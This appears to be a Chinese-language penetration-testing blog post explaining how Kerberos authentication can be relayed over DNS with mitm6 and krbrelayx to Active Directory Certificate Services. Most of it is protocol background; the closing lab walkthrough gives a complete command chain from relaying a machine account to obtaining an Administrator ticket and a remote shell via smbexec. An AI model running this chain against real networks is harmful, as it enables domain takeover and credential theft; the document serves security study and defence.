---
title: 使用 MITM6 通过 DNS 中继 Kerberos 身份验证
date: 2022-04-26 06:26:00 +0800
author: WHOAMI
toc: true
categories: ["Windows Security"]
tags: ["Kerberos", "Active Directory", "Kerberos Relay", "Mitm"]
layout: post
---

2021 年 10 月，James Forshaw（[@tiraniddo](https://twitter.com/tiraniddo)）在 [Project Zero](https://googleprojectzero.blogspot.com/) 上发表了一篇名为 [*Using Kerberos for Authentication Relay Attacks*](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html) 的文章，介绍了其在中继 Kerberos 身份验证方面的相关研究。该项研究一举反驳了多年以来不能中继 Kerberos 的观点。文章中介绍了一些技巧，可以使 Windows 对不同的服务主体名称（SPN）进行身份验证，这意味着 Kerberos 并不像我假设的那样完全可以避免中继。这促使 Dirk-jan Mollema（[@dirkjanm](https://twitter.com/_dirkjan)）研究了一种新的滥用技术：使用 mitm6 通过 DNS 中继 Kerberos 身份验证。



通过 mitm6 工具，我们可以劫持客户端的 IPv6 DHCP 请求，并最终接管客户端的 DNS。在这种情况下，您可以让客户端机器使用 Kerberos 及其机器帐户向我们进行身份验证。此身份验证可以中继到任何不强制执行完整性保护的服务，例如基于 HTTP 协议的 Active Directory 证书服务（AD CS）的 Web 注册接口。本篇博客描述了这项技术的背景以及如何使用 mitm6 通过 DNS 中继 Kerberos 身份验证。

## Background

基于 Windows 的企业网络依靠网络身份验证协议（例如 NTLM 和 Kerberos）来实现单点认证。这些协议允许域用户无缝连接到企业资源，而无需重复输入密码。这主要通过计算机的本地安全机构（Local Security Authority，LSA）在用户首次完成身份验证时存储用户的凭据来起作用。然后，LSA 可以重用这些凭据在网络中自动进行身份验证，而无需用户交互。这其中最常见的是 HTTP 或 SMB 等网络协议的常见客户端必须在没有用户交互的情况下自动执行身份验证，否则会违背避免向用户询问其凭据的目的。

但是，重用凭据有一个很大的缺陷。如果攻击者可以欺骗用户连接到他们控制的服务器，这种自动身份验证可能会成为问题。攻击者可以诱导用户的网络客户端启动身份验证过程并重用这些信息对不相关的服务进行身份验证，从而允许攻击者以用户身份访问该服务的资源。当以这种方式捕获身份验证消息并将其转发到另一个系统时，它被称为身份验证中继（Relay）攻击。

![](/assets/posts/2022-04-26-relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/image-20220426203905996.png)

NTLM Relay 是最经典的身份验证中继攻击，其最早由 Dead Cow 的 Josh Buchbinder 于 2001 年发布。然而，即使在 2021 年，NTLM Relay 攻击仍然是 Windows 域网络配置的重要威胁。

截至本文所撰写时，NTLM Relay 的最新主要滥用是通过 Active Directory 证书服务的 Web 注册服务，其与 [PetitPotam](https://github.com/topotam/PetitPotam) 技术相结合可以诱导域控制器执行 NTLM 身份验证，并为域控制器注册 AD CS 证书，从而允许未经身份验证的攻击者破坏 Windows 域环境。该项技术起源于 Lee Christensen（[@tifkin_](https://twitter.com/tifkin_)）和 Will Schroeder（[@harmj0y](https://twitter.com/harmj0y)）在 2021 年的 BlackHat 大会上发布的名为 [*Certified Pre-Owned - Abusing Active Directory Certificate Services*](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) 的白皮书，相关内容可以看我之前的博客：[*Attack Surface Mining For AD CS*](https://whoamianony.top/posts/attack-surface-mining-for-ad-cs/)。

多年来，Microsoft 为缓解身份验证中继攻击做出了许多努力。最好的缓解措施依赖于攻击者不知道用户密码或控制身份验证过程的事实。这包括使用会话密钥对网络流量进行签名和加密，该会话密钥受用户密码或通道绑定保护，作为身份验证扩展保护（Extended Protection for Authentication，EPA）的一部分 ，可防止将身份验证中继到 TLS 下的网络协议。

此外，另一个常见的缓解措施是使用组策略禁用特定服务或网络范围内的 NTLM 身份验证。虽然这有潜在的兼容性问题，但仅允许 Kerberos 协议的身份验证相对而言应该更安全。那么，禁用了 NTLM 协议后是否足以真正消除 Windows 身份验证中继攻击带来的威胁呢？

### Why are there no Kerberos Relay Attacks?

如果 NTLM 协议被禁用，那么能否转而中继 Kerberos 身份验证呢？然而，多年以来并没有关于 Kerberos 中继攻击的公开研究或资料，那么到底存不存在 Kerberos 中继攻击呢？

显而易见的是，NTLM 之所以易于中继，是因为它并非旨在将特定服务的身份验证与任何其他服务区分开来。唯一独特的方面是服务器质询，但该值不是特定于服务的，因此 SMB 的身份验证可以转发到 HTTP，而受害者服务无法区分。

但是，Kerberos 始终要求通过主体名称预先指定身份验证的目标，通常这是服务主体名称（[Service Principal Names](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names)，SPN），尽管在某些情况下它可以是用户主体名称 (User Principal Names，UPN)。 SPN 通常表示为 `CLASS/INSTANCE:PORT/NAME` 形式的字符串，其中 `CLASS` 是服务类，例如 HTTP、CIFS、LDAP、DNS 或 HOST 等，`INSTANCE` 通常是托管服务的服务器的 DNS 名称，`PORT` 和 `NAME` 是可选的。

Kerberos 票据授予服务（TGS）使用 SPN 为身份验证生成的 Kerberos 服务票据选择共享加密密钥。此票据包含基于在用户预 Kerberos 身份验证过程中请求的票据授予票据（TGT）内容的身份验证用户的详细信息。然后，客户端可以将服务票据打包到身份验证请求（AP_REQ）身份验证令牌中以发送到服务器。

在不知道共享加密密钥的情况下，服务无法解密 Kerberos 服务票证，则身份验证会失败。因此，如果 Kerberos 身份验证是尝试使用 SPN `CIFS/fileserver.domain.com` 对 SMB 服务进行的 ，那么如果中继的目标是具有 SPN `HTTP/fileserver.domain.com` 的 HTTP 服务，则该票据不可用，因为共享密钥不同。

在域环境中，域控制器将 SPN 与用户帐户相关联，最常见的是加入域的服务器的计算机帐户，并且该共享密钥来自机器帐户的密码哈希值。比如，SPN `CIFS/fileserver.domain.com` 和 SPN `HTTP/fileserver.domain.com`可能会分配给名为 `FILESERVER$` 的计算机帐户，因此两个 SPN 的共享加密密钥将是相同的，那么理论上可以将对其中一个服务的身份验证中继到另一个服务。


用于 Kerberos 身份验证的 SPN 通常由目标服务器的主机名定义。在中继攻击中，攻击者的服务器将与目标服务器不同。例如，SMB 连接可能以攻击者的服务器为目标，并将分配 SPN `CIFS/evil.com`。假设此 SPN 已注册，由于计算机帐户不同，它很可能具有与 SPN `CIFS/fileserver.domain.com` 不同的共享加密密钥。因此，将身份验证中继到目标 SMB 服务将失败，因为票证无法解密。

正是因为 SPN 与目标服务的共享加密密钥相关联的要求，使得很少有人认为 Kerberos 中继攻击的威胁是现实存在的。

但是，如果攻击者可以控制 SPN，则没有什么能阻止 Kerberos 身份验证被中继了。缓解中继 Kerberos 身份验证的唯一方法是让服务通过使用签名或通道绑定来保护自己。但是，即使在 LDAP 等关键协议上，这些服务保护也不是默认设置的。

**在没有其他服务保护的情况下，Kerberos 中继的唯一限制是 SPN 的选择，因此本研究重点关注普通协议如何选择 SPN，以及它是否可以受到攻击者的影响以实现 Kerberos 身份验证中继。**

### Kerberos Relay Requirements

在可控环境中，很容易证明 Kerberos 中继是可能的。我们可以编写一个简单的客户端，并使用 SSPI API 与 LSA 通信并实现网络身份验证。此客户端调用 InitializeSecurityContext  API，它将生成一个 AP_REQ 身份验证令牌，其中包含任意 SPN 的 Kerberos 服务票证。此 AP_REQ 可以转发到中间服务器，然后由中间服务器中继到 SPN 代表的真实服务。如果没有其他服务保护措施，这将会起作用。


但是，客户端调用 InitializeSecurityContext 的方式有一些警告， 这将影响生成的 AP_REQ 的有用性，即使攻击者可以修改 SPN。如果客户端指定了 ISC_REQ_CONFIDENTIALITY、ISC_REQ_INTEGRITY 、ISC_REQ_REPLAY_DETECT 或ISC_REQ_SEQUENCE_DETECT 请求标志，则生成的 AP_REQ 将启用签名加密和/或消息完整性检查。当服务器使用AcceptSecurityContext API 接收到 AP_REQ 时，它将返回一组标志，指示客户端是否启用了签名加密或完整性检查。一些服务会使用这些返回的标志启用相关的服务保护。

例如，LDAP 服务的默认设置是在客户端支持的情况下启用签名/加密，即协商签名。因此，如果客户端启用了这些保护中的任何一个，那么就无法将 Kerberos 身份验证中继到 LDAP。但是，其他服务（例如 HTTP）通常不支持签名，因此允许接受指定了上述请求标志的身份验证令牌，而不做出任何保护性的措施。

另一个警告是客户端可以指定通道绑定信息，通常来自通信中使用的 TLS 证书。通道绑定信息可以由攻击者控制，但如果没有 TLS 实现中的错误或确定通道绑定信息本身的代码，则不能设置为任意值。


虽然服务可以选择仅在客户端支持的情况下启用通道绑定，但所有 Windows Kerberos AP_REQ 令牌都通过 `Authenticator` 属性中的 `KERB_AP_OPTIONS_CBT` 选项标志指示支持。即使 Sagi Sheinfeld 等人证明了，如果您可以从非 Windows 源获取 AP_REQ，它将不会设置该选项标志，因此不会强制执行通道绑定，但这显然不是微软会做的事情。Windows 客户端也有可能通过注册表配置选项禁用通道绑定，尽管这在现实世界的网络中似乎不太可能。 

如果客户端在生成 AP_REQ 时指定 `ISC_REQ_MUTUAL_AUTH` 请求标志，它将启用客户端和服务器之间的相互身份验证。客户端在发送 AP_REQ 以证明它拥有共享加密密钥后，期望从服务器接收到身份验证响应 AP_REP。如果服务器没有返回有效的 AP_REP，客户端可以假定它是一个欺骗服务器并拒绝与其继续通信。


从中继的角度来看，相互身份验证并不重要，因为中继攻击的目标是服务器，而不是客户端。目标服务器在接受 AP_REQ 后将假定身份验证已完成，因此这就是攻击者需要转发的全部内容。虽然服务器将生成 AP_REP 并将其返回给攻击者，但他们可以直接丢弃它，除非他们出于某种原因需要中继客户端继续参与通信。

## Kerberos over DNS

DNS 是一个拥有有效 Kerberos 基础架构的关键组件。在 Active Directory 中，DNS 支持使用 Kerberos 在 DNS 上进行身份验证的操作。这是 “[Secure Dynamic Update](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc961412(v=technet.10)?redirectedfrom=MSDN)” 操作的一部分，用于使具有动态地址的网络客户端的 DNS 记录在其网络状态发生更改时能与其当前的 IP 地址保持同步。下图中显示了 DNS 动态更新过程中涉及的几个步骤：

![](/assets/posts/2022-04-26-relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/image-20220426203926963.png)

（1）在步骤 1 中，客户端查询本地名称服务器以确定哪个服务器对其所处的区域具有权威性。本地名称服务器以区域名称和对该区域具有权威性的主服务器地址进行响应。

（2）在步骤 2 中，客户端尝试进行非安全更新。由于该区域被配置为安全动态更新，因此权威名称服务器将对客户端的更新请求进行拒绝。如果该区域被配置为非安全动态更新，则服务器将尝试添加、删除或修改 Active Directory 中的资源记录。

（3）在步骤 3 中，客户端和服务器开始 TKEY 协商。首先，客户端和服务器协商底层安全机制。由于 Windows 2000 动态更新客户端和服务器都提出了 Kerberos 协议，因此他们决定使用它。接下来，客户端和服务器将使用 Kerberos 安全机制，验证彼此的身份并建立安全上下文，并生成 TSIG 密钥。

（4）在步骤 4 中，经过身份验证后的客户端再次向服务器发送动态更新请求，并使用在步骤 3 中建立的安全上下文生成的 TSIG 密钥进行签名。DNS 服务器使用安全上下文和 TSIG 密钥验证动态更新数据包的来源。

（5）在步骤 5 中，服务器开始尝试在 Active Directory 中添加、删除或修改资源记录。它是否可以进行更新取决于客户端是否具有进行更新的适当权限以及是否满足先决条件。

（6）在步骤 6 中，服务器向客户端发送回复，说明它是否能够进行更新，并使用 TSIG 密钥签名。如果客户端收到欺骗性回复，它会将其丢弃并等待签名回复。

如下 WireShark 抓包结果显示了上述过程：

![](/assets/posts/2022-04-26-relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/image-20220425194942795.png)

让我们仔细看看第 83 和第 84 个数据包，其对应上述步骤 3。TKEY 协商消息实际上是通过 TCP 进行发送的，因为它比 UDP 允许的最大 512 字节大很多。这主要是因为其中包含了相当大的 TKEY 附加记录，比如我们经常看到的用于 Kerberos 身份验证的结构：

![](/assets/posts/2022-04-26-relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/image-20220425195522953.png)

可以看到，此查询中包含了一个完整的 GSS-API 和 SPNEGO 结构，其中包含 Kerberos AP-REQ，其实质是对服务的正常 Kerberos 身份验证流程。服务器的应答消息中将返回一个 GSSAPI 和 SPNEGO 结构，其中包含了 Kerberos AP-REP，以指示认证成功，如下图诉所示。此 AP-REP 包含一个 TSIG 会话密钥，客户端可以使用该密钥进一步签署其 DNS 更新查询。

![](/assets/posts/2022-04-26-relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/image-20220425200201333.png)

服务器可以存储密钥和经过身份验证的用户/计算机，并以经过身份验证的方式处理更新，而不必将身份验证绑定到特定的 TCP 套接字，因为以后的查询可能通过 UDP 发送。

## Abusing DNS authentication

如果我们能够拦截 DNS 查询，就有可能欺骗受害客户端向我们发送本应发给真实 DNS 服务器的 Kerberos 认证票据。这种拦截可以在 Windows 默认配置中，由同一 (V)LAN 中的任何系统上通过 [mitm6](https://github.com/dirkjanm/mitm6) 工具完成。Mitm6 将自己宣称为 DNS 服务器（详情请看：[《使用 MITM6 中继 WPAD 身份验证》](https://whoamianony.top/relaying-wpad-authentication-using-mitm6/)），这意味着受害者将向我们发送 `SOA` 请求，如果我们拒绝他们的动态更新，则客户端会使用 Kerberos 进行身份验证。

到这里可能就有点棘手了，前文中我们曾说过，用于 Kerberos 身份验证的 SPN 通常由目标服务器的主机名定义。通常 DNS 服务器角色将在域控制器上运行，因此 DNS 服务的服务票证将由 SPN 名称绑定在 DC 上运行的服务。但是我们可以更改票证中的  SPN 名称，这意味着我们可以将此票据中继到例如 LDAP 等其他服务上。

此外，正如 James Forshaw 在他其文章中所描述的，许多服务类实际上会隐式映射到 HOST 类。事实证明，这包括 DNS，因此当我们的受害者请求 DNS 服务的票证时，这实际上适用于具有 HOST SPN 的任何帐户。由于 HOST SPN 是默认在域中的所有计算机帐户上设置的，因此可以针对在这些帐户下运行的任何服务。

此外，中继的另一个难题是签名和消息完整性保护的问题。但是，正如前文中所描述的，其他服务（例如 HTTP）通常不支持签名。并且，Lee Christensen 和 Will Schroeder 关于 AD CS 服务研究为我们提供了一个可用的高价值 HTTP 端点。由于 AD CS 的证书颁发机构 Web 注册接口支持 Kerberos 身份验证，并且不支持签名保护，因此测试人员可以将假 DNS 服务器上收到的 Kerberos 身份验证中继到 AD CS 服务。完成后，我们可以为我们中继的计算机帐户申请 AD 证书，并使用我在之前的[博客](https://whoamianony.top/attack-surface-mining-for-ad-cs/)中谈到的 NTLM 哈希恢复或 S4U2Self 技术。使用这些技术，我们可以 SYSTEM 权限威胁受害计算机。

## Changes to krbrelayx and mitm6

最初，[krbrelayx](https://github.com/dirkjanm/krbrelayx) 并不是真正用来中继的工具。相反，它通过使用非约束性委派来捕获 Kerberos TGT，并使用这些 TGT 执行 Kerberos 身份验证。由于现在有一个实际中继 Kerberos 身份验证的用例，因此 Dirk-jan Mollema 更新了 krbrelayx 中的功能，使其可以在真正的中继模式下运行，但仅支持中继到 HTTP 和 LDAP。至于 mitm6，Dirk-jan 添加了指定认证目标的选项，当受害者询问 SOA 记录时，这将是权威性名称服务器响应中的主机名。这将使受害者为我们的目标服务器而不是合法的 DNS 服务器请求 Kerberos 服务票据。

## Attack example

（1）首先执行以下命令设置 krbrelayx，将 AD CS 主机（adcs.pentest.com）指定为中继的目标，并将接口的 IPv4 地址指定为绑定 DNS 服务器的接口。

```bash
python3 krbrelayx.py --target http://adcs.pentest.com/certsrv/ -ip 172.26.10.134 --victim win10-client1.pentest.com --adcs --template Machine
```

![](/assets/posts/2022-04-26-relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/image-20220426144651930.png)

（2）然后执行以下命令设置 mitm6，使用 AD CS 主机的名称作为认证目标：

```bash
mitm6 --domain pentest.com --host-allowlist win10-client1.pentest.com --relay adcs.pentest.com -i eth0 -v
```

![](/assets/posts/2022-04-26-relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/image-20220426144748831.png)

现在，我们可以等待受害者获得 IPv6 地址并连接到我们的恶意服务器。如下图所示，成功为机器账户 `WIN10-CLIENT1$` 的申请到了证书，该证书适用 Base64 加密。

![](/assets/posts/2022-04-26-relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/image-20220426174232847.png)

（3）我们将该证书的内容保存在 win10-client1.txt 文件中，有了这个证书，我们可以使用 [PKINITtools](https://github.com/dirkjanm/PKINITtools) 或 [Rubeus](https://github.com/GhostPack/Rubeus) 工具，代表该机器账户执行 Kerberos 身份验证，并为其申请 TGT 票据：

```bash
python3 gettgtpkinit.py pentest.com/win10-client1\$ win10-client1.ccache -pfx-base64 $(cat win10-client1.txt)
```

![](/assets/posts/2022-04-26-relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/image-20220426195532151.png)

（4）至此我们已经获取了 TGT 票据，但是该票据为 WIN10-CLIENT1 机器账户的票据。由于机器账户不允许登录，我们无法通过机器账户对目标主机执行交互式操作。不过我们可以通过 Kerberos 的 S4U2Self 扩展协议，使用已获取的 TGT 为域管理员用户申请针对 `cifs/win10-client1.pentest.com@pentest.com` SPN 的服务票据，相关命令如下：

> 尽管需要在机器帐户上专门启用约束委派属性才能使 S4U2proxy 跨系统工作，但是任何具有 SPN 的主体都可以调用 S4U2self 去获取针对自身的高权限票据。

```bash
python3 gets4uticket.py kerberos+ccache://pentest.com\\win10-client1\$:win10-client1.ccache@dc01.pentest.com cifs/win10-client1.pentest.com@pentest.com Administrator@pentest.com Administrator.ccache -v
```

![](/assets/posts/2022-04-26-relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/image-20220426195701175.png)

（5）最后，我们通过设置环境变量 `KRB5CCNAME` 来使用 Administrator 用户的票据，并通过 smbexec.py 获取  WIN10-CLIENT1 机器的最高权限，相关命令如下。

```bash
export KRB5CCNAME=/root/PKINITtools/Administrator.ccache
python3 smbexec.py -k pentest.com/Administrator@win10-client1.pentest.com -no-pass
```

![](/assets/posts/2022-04-26-relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/image-20220426195846775.png)

## Ending......

参考文献：

> https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html
>
> https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/
>
> https://exploit.ph/defending-the-three-headed-relay.html
